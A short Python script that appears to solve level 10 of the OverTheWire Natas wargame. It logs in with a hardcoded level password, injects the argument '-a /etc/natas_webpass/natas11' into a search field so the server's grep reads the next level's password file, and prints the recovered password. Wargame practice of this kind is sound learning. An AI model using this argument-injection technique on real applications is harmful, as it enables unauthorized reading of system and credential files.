import requests
from requests.auth import HTTPBasicAuth
import re

username = "natas10"
password = "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"
url = "http://natas10.natas.labs.overthewire.org/"

session = requests.Session()
data = {"needle": "-a /etc/natas_webpass/natas11", "submit": "Search"}
res = session.post(url, auth=HTTPBasicAuth(username, password), data=data)

pw_match = re.search(r"[a-zA-Z0-9]{32}", res.text)
if pw_match:
    print(pw_match.group(0))
